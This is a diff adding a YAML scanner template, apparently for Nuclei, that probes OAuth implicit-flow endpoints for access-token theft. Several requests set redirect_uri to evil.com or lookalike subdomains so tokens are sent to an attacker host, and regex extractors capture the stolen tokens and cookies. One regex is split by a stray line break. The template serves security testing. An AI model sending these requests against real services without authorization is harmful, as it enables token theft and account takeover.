@@ -1,0 +1,111 @@
+id: medium-auth-oauth-implicit-flow-token-theft
+
+info:
+  name: OAuth Implicit Flow Token Theft - Access Token Interception
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced OAuth 2.0 implicit flow token theft template targeting access token exposure vulnerabilities.
+    Exploits redirect URI manipulation, fragment leakage, and postMessage attacks to steal OAuth tokens
+    and achieve unauthorized access to protected resources and user accounts.
+  reference:
+    - https://tools.ietf.org/html/rfc6749#section-10.3
+    - https://tools.ietf.org/html/rfc6819#section-4.4.2
+    - https://portswigger.net/web-security/oauth
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+    cvss-score: 8.7
+    cwe-id: CWE-601
+  tags: oauth,implicit-flow,token-theft,redirect-uri,postmessage,red-team
+
+http:
+  - raw:
+      # Test 1: OAuth Redirect URI Manipulation
+      - |
+        GET /oauth/authorize?response_type=token&client_id=12345&redirect_uri=https://evil.com/callback&scope=read+write&state=xyz HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; OAuthThief/1.0)
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        
+      # Test 2: Subdomain Redirect URI Bypass
+      - |
+        GET /oauth/authorize?response_type=token&client_id=12345&redirect_uri=https://evil.{{Hostname}}/callback&scope=admin&state=abc123 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 3: Open Redirect via OAuth Callback
+      - |
+        GET /oauth/authorize?response_type=token&client_id=12345&redirect_uri=https://{{Hostname}}/callback?next=https://evil.com&scope=profile&state=test HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+        
+      # Test 4: Fragment Injection Attack
+      - |
+        GET /oauth/authorize?response_type=token&client_id=12345&redirect_uri=https://{{Hostname}}/callback%23evil.com&scope=read&state=fragment HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 5: PostMessage Token Theft
+      - |
+        GET /oauth/callback HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+        Referer: https://{{Hostname}}/oauth/authorize?response_type=token&client_id=12345
+        
+      # Test 6: CSRF Token Fixation
+      - |
+        GET /oauth/authorize?response_type=token&client_id=12345&redirect_uri=https://{{Hostname}}/callback&scope=admin&state=fixed_state_value HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        
+      # Test 7: Wildcard Redirect URI Abuse
+      - |
+        GET /oauth/authorize?response_type=token&client_id=12345&redirect_uri=https://evil.com.{{Hostname}}/callback&scope=write&state=wildcard HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 307
+          
+      - type: word
+        part: body
+        words:
+          - "access_token"
+          - "bearer"
+          - "token_type"
+          - "expires_in"
+          - "scope"
+          - "state"
+        condition: or
+        
+      - type: word
+        part: header
+        words:
+          - "Location:"
+          - "Set-Cookie:"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: access_token
+        part: body
+        regex:
+          - 'access_token[=:]([a-zA-Z0-9._-]+)'
+          
+      - type: regex
+        name: redirect_location
+        part: header
+        regex:
+          - 'Location:\s*([^
+]+)'
+          
+      - type: kval
+        part: header
+        kval:
+          - Location
+          - Set-Cookie
